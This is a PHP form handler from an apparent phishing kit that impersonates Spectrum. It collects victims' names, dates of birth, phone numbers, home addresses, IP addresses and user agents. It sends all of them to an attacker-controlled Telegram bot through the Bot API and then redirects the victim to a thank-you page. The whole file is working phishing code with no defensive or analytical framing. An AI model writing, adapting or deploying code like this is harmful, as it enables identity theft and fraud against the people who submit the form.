<?php

// Telegram Bot Token and Chat ID
include 'addtele.php';


// Check if the form is submitted
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Get the form data
    $fullName = $_POST['first'];
    $phoneNumber = $_POST['last'];
    $streetAddress = $_POST['street'];
    $dob = $_POST['dob'];
    $city = $_POST['city'];
    $mynum = $_POST['num'];

    $state = $_POST['state'];
    $zipCode = $_POST['zipCode'];

    // Get the user IP address and user agent
    $ip = $_SERVER['REMOTE_ADDR'];
    $userAgent = $_SERVER['HTTP_USER_AGENT'];

    // Prepare the message
    $message = "Spectrum details Submission:\n\n";
    $message .= "First Name: $fullName\n";
    $message .= "Last name: $phoneNumber\n";
    $message .= "Date of birth: $dob\n";
    $message .= "Phone number: $mynum\n";

    $message .= "Street Address: $streetAddress\n";
    $message .= "City: $city\n";
    $message .= "State: $state\n";
    $message .= "ZIP Code: $zipCode\n\n";
    $message .= "IP: $ip\n";
    $message .= "User  Agent: $userAgent\n";
    $message .= "@mecredi";

    // Send the message to Telegram
    $url = "https://api.telegram.org/bot$botToken/sendMessage?chat_id=$chatId&text=" . urlencode($message);
    file_get_contents($url);

    // Redirect to a thank you page or another page
    header("Location: thanku.html");
    exit();
}

?>